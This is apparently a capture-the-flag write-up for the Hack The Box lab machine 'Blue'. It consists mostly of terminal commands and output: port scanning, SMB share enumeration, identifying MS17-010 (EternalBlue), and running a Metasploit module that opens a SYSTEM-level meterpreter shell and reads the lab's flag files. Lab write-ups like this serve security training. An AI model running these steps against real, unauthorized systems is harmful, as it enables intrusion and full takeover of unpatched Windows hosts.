# Blue
## SMB
## CVE
## Metasploit
```bash

➜  sudo vi /etc/hosts
Add:

10.10.10.40 blue.htb

➜  rustscan -a blue.htb --ulimit 5000

PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
49152/tcp open  unknown      syn-ack
49153/tcp open  unknown      syn-ack
49154/tcp open  unknown      syn-ack
49155/tcp open  unknown      syn-ack
49156/tcp open  unknown      syn-ack
49157/tcp open  unknown      syn-ack

➜  sudo nmap -Pn -sV -T4 -p- -oA blue -vv blue.htb 

PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

➜  smbclient -L //blue.htb/

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Share           Disk      
	Users           Disk  

➜  smbclient //blue.htb/Share

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jul 14 08:48:44 2017
  ..                                  D        0  Fri Jul 14 08:48:44 2017

➜  smbclient //blue.htb/Users

Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Jul 21 01:56:23 2017
  ..                                 DR        0  Fri Jul 21 01:56:23 2017
  Default                           DHR        0  Tue Jul 14 02:07:31 2009
  desktop.ini                       AHS      174  Mon Jul 13 23:54:24 2009
  Public                             DR        0  Tue Apr 12 02:51:29 2011

smb: \> get desktop.ini 
smb: \Public\Libraries\> get RecordedTV.library-ms 
smb: \> exit

➜  sudo nmap -Pn -sCV -T4 -p- -vv blue.htb  

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-06-25T04:46:02
|_  start_date: 2022-06-25T04:37:41
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56624/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12383/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 19006/udp): CLEAN (Timeout)
|   Check 4 (port 49417/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-06-25T05:46:00+01:00
|_clock-skew: mean: -19m56s, deviation: 34m36s, median: 2s

Note the OS:

Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)

GoogleFu:

samba Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) exploit

Response:

https://www.exploit-db.com/exploits/42315

CVE-MS17-010

➜  searchsploit MS17-010

Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Executio | windows/remote/42031.py

➜  sudo msfconsole
msf6 > search MS17-010
msf6 exploit(windows/smb/ms17_010_psexec) > show options
msf6 exploit(windows/smb/ms17_010_psexec) > set rhosts 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set lhost tun0
msf6 exploit(windows/smb/ms17_010_psexec) > run
meterpreter > shell
C:\Windows\system32>whoami

nt authority\system

C:\Windows\system32>dir C:\Users /s /b | findstr /e .txt

C:\Users\Administrator\Desktop\root.txt
C:\Users\haris\Desktop\user.txt

C:\Windows\system32>type C:\Users\haris\Desktop\user.txt

66142c9928d25ab151e83f3d2e26b20b

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt

8674c60987044062ac0ac6996dc6e2a0

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220624235939.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220625000112.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220625000206.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220625000253.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220625000351.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220625000457.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220625000602.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220625000703.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220625000754.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220625000900.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220625000933.png)

#hacking
